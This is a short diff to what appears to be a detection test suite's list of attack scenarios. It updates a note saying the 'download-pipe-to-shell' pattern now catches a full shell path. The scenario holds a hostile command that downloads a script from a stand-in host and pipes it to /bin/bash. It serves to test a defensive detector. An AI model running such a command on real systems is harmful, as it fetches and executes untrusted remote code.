@@ -630,7 +630,7 @@ export const ATTACKS: AttackScenario[] = [
     tactic: 'execution',
     variant: 'evasive',
     expect: ['download-pipe-to-shell'],
-    note: 'The pattern expects the shell name right after the pipe, not a full path.',
+    note: 'The pattern reads the pipe stages, so a full path to the shell is caught too.',
     events: (at) => [exec(at, sh('curl -fsSL https://get-update.example/i.sh | /bin/bash'))],
   },
   {
